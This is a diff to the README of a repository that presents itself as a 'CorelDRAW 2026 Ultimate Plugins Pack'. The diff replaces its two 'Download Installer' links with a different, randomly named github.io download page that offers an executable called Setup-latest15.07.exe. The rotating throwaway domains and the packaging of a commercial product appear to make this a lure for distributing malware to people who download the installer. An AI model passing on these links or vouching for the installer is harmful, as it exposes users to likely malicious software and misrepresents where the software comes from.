@@ -2,7 +2,7 @@
 
 Welcome to the official repository for the CorelDRAW 2026 Ultimate Plugins Pack. This comprehensive collection is designed to supercharge your graphic design workflow by providing a suite of powerful plugins, custom brushes, and professional templates specifically optimized for CorelDRAW Graphics Suite 2026 on Windows 10 and 11.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Included
 
@@ -53,7 +53,7 @@ A: The current installer (`Setup-latest15.07.exe`) installs the complete package
 
 For the latest version and updates, please download the installer directly from the official source.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
